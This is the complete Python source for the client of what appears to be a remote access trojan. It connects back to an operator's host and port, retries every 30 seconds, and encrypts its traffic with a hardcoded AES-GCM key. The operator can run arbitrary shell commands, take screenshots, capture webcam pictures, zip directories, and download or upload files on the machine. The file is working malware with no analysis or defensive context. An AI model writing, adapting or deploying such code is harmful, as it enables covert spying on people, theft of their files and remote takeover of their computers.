# standard python libraries
import time
import subprocess
import base64
import socket
import sys
import os
import zipfile
import json
import multiprocessing
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
# non-standard python libraries
import mss
import cv2


class Client:
    def __init__(self):
        self.connection = Connection()
        self.exit = False
        self.response = multiprocessing.Manager().dict()

    def main(self):
        while not self.exit:
            request = self.connection.recv(self.connection.sock)
            self.response["data"] = str()
            self.response["error"] = str()

            if request["cmd"] == "f":
                process = multiprocessing.Process(target=self.cwd, args=(self.response, request["mode"], request["path"],))
                self.handle_process(process, request["timeout"])
                self.connection.send(self.response, self.connection.sock)
            elif request["cmd"] == "c":
                process = multiprocessing.Process(target=self.execute_command, args=(self.response, request["exe"],))
                self.handle_process(process, request["timeout"])
                self.connection.send(self.response, self.connection.sock)
            elif request["cmd"] == "z":
                process = multiprocessing.Process(target=self.zip_file_or_folder, args=(self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
                self.handle_process(process, request["timeout"])
                self.connection.send(self.response, self.connection.sock)
            elif request["cmd"] == "w":
                process = multiprocessing.Process(target=self.capture_camera_picture, args=(self.response, request["cam_port"], request["save_path"],))
                self.handle_process(process, request["timeout"])
                self.connection.send(self.response, self.connection.sock)
            elif request["cmd"] == "s":
                process = multiprocessing.Process(target=self.capture_screenshot, args=(self.response, request["monitor"], request["save_path"],))
                self.handle_process(process, request["timeout"])
                self.connection.send(self.response, self.connection.sock)
            elif request["cmd"] == "d":
                self.download_file(request["open_path"])
            elif request["cmd"] == "u":
                self.upload_file(request["save_path"], request["data"])
            elif request["cmd"] == "r":
                process = multiprocessing.Process(target=self.connection.sock.close)
                self.handle_process(process, request["timeout"])
                self.exit = True

    def cwd(self, response, mode, path):
        if mode == "set":
            try:
                os.chdir(path)
            except FileNotFoundError:
                response["error"] = "FileNotFoundError"
            except PermissionError:
                response["error"] = "PermissionError"
        else:
            response["data"] = os.getcwd()

    def execute_command(self, response, command):
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            response["data"] = process.stdout.read()
            response["error"] = process.stderr.read()
        except UnicodeDecodeError:
            response["error"] = "UnicodeDecodeError"

    def download_file(self, path):
        response = {"data": str(), "error": str()}
        try:
            with open(path, "rb") as file:
                response["data"] = base64.b64encode(file.read()).decode(self.connection.CODEC)
        except FileNotFoundError:
            response["error"] = "FileNotFoundError"
        except PermissionError:
            response["error"] = "PermissionError"
        self.connection.send(response, self.connection.sock)

    def upload_file(self, path, data):
        response = {"error": str()}
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(data))
        except PermissionError:
            response["error"] = "PermissionError"
        self.connection.send(response, self.connection.sock)

    def capture_screenshot(self, response, monitor, path):
        try:
            with mss.mss() as sct:
                sct.shot(mon=int(monitor), output=path)
        except mss.exception.ScreenShotError:
            response["error"] = "MonitorDoesNotExist"
        except ValueError:
            response["error"] = "InvalidMonitorIndex"
        except FileNotFoundError:
            response["error"] = "FileNotFoundError"

    def zip_file_or_folder(self, response, compression_level, path_to_open, path_to_save):
        try:
            zip_file = zipfile.ZipFile(path_to_save, 'w', zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
            if os.path.isdir(path_to_open):
                relative_path = os.path.dirname(path_to_open)
                for root, dirs, files in os.walk(path_to_open):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(path_to_open, os.path.basename(path_to_open))
            zip_file.close()
        except PermissionError:
            response["error"] = "PermissionError"
        except FileNotFoundError:
            response["error"] = "FileNotFoundError"

    def capture_camera_picture(self, response, camera_port, path_to_save):
        video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
        if not video_capture.isOpened():
            response["error"] = "CouldNotOpenDevice"
            return
        success, frame = video_capture.read()
        if not success:
            response["error"] = "UnableToCapturePicture"
        video_capture.release()
        success = cv2.imwrite(path_to_save, frame)
        if not success:
            response["error"] = "UnableToSavePicture"

    def handle_process(self, process, timeout):
        process.start()
        process.join(timeout)
        if process.is_alive():
            process.terminate()
            self.response["data"] = ""
            self.response["error"] = "TimeoutExpired"


class Connection:
    def __init__(self):
        self.CODEC = "utf-8"
        self.END_MARKER = "-".encode(self.CODEC)
        self.PACKET_SIZE = 1024

        HOST = "127.0.0.1"
        PORT = 10001
        KEY = b'\xbch`9\xd6k\xcbT\xed\xa5\xef_\x9d*\xda\xd2sER\xedA\xc0a\x1b)\xcc9\xb2\xe7\x91\xc2A'

        self.crypter = AESGCM(KEY)

        if len(sys.argv) == 3:
            try:
                HOST = str(sys.argv[1])
                PORT = int(sys.argv[2])
            except ValueError:  # InvalidCommandlineArguments
                HOST = "127.0.0.1"
                PORT = 10001

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                self.sock.connect((HOST, PORT))
                break
            except socket.error:
                time.sleep(30)

    def send(self, data: dict, connection):
        data = base64.b64encode(self.encrypt(json.dumps(data.copy()).encode(self.CODEC))) + self.END_MARKER
        header = base64.b64encode(self.encrypt(json.dumps({"length": len(data)}.copy()).encode(self.CODEC))) + self.END_MARKER
        connection.send(header)
        connection.send(data)

    def recv(self, connection) -> dict:
        data = bytearray()
        while not data.endswith(self.END_MARKER):
            data.extend(connection.recv(self.PACKET_SIZE))
        return json.loads(self.decrypt(base64.b64decode(data[:-1])))

    def encrypt(self, data):
        nonce = os.urandom(12)
        return nonce + self.crypter.encrypt(nonce, data, b"")

    def decrypt(self, cipher):
        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")


if __name__ == "__main__":
    #while True:
    #    try:
            client = Client()
            client.main()
    #        if client.exit:
    #            break
    #    except:
    #        pass
